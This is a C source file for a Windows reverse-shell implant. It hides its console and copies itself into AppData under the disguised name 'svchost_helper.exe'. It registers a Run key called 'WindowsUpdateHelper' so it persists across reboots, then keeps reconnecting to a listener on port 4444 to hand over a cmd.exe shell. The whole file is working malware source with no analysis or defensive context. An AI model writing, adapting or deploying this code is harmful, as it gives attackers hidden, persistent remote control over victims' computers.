#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")

#define LHOST "127.0.0.1"
#define LPORT 4444
#define PERSIST_NAME "WindowsUpdateHelper"

void hide_console(void) {
    FreeConsole();
    HWND hwnd = GetConsoleWindow();
    if (hwnd) ShowWindow(hwnd, SW_HIDE);
}

int install_persistence(void) {
    char src[MAX_PATH];
    char dest[MAX_PATH];
    char appdata[MAX_PATH];
    HKEY hKey;
    char value[MAX_PATH + 32];

    if (!GetModuleFileNameA(NULL, src, MAX_PATH)) return 0;
    if (!GetEnvironmentVariableA("APPDATA", appdata, MAX_PATH)) return 0;

    snprintf(dest, MAX_PATH, "%s\\Microsoft\\Windows\\svchost_helper.exe", appdata);

    CreateDirectoryA(appdata, NULL);
    char mid[MAX_PATH];
    snprintf(mid, MAX_PATH, "%s\\Microsoft", appdata);
    CreateDirectoryA(mid, NULL);
    snprintf(mid, MAX_PATH, "%s\\Microsoft\\Windows", appdata);
    CreateDirectoryA(mid, NULL);

    CopyFileA(src, dest, FALSE);

    if (RegOpenKeyExA(HKEY_CURRENT_USER,
                      "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                      0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        snprintf(value, sizeof(value), "\"%s\"", dest);
        RegSetValueExA(hKey, PERSIST_NAME, 0, REG_SZ, (BYTE*)value, (DWORD)(strlen(value) + 1));
        RegCloseKey(hKey);
    }
    return 1;
}

int main(void) {
    hide_console();
    install_persistence();

    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return 1;

    while (1) {
        s = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
        if (s == INVALID_SOCKET) {
            Sleep(8000);
            continue;
        }

        memset(&server, 0, sizeof(server));
        server.sin_family = AF_INET;
        server.sin_addr.s_addr = inet_addr(LHOST);
        server.sin_port = htons(LPORT);

        if (connect(s, (struct sockaddr *)&server, sizeof(server)) != 0) {
            closesocket(s);
            Sleep(8000);
            continue;
        }

        memset(&si, 0, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;

        if (CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE,
                           CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            WaitForSingleObject(pi.hProcess, INFINITE);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }

        closesocket(s);
        Sleep(5000);
    }

    WSACleanup();
    return 0;
}
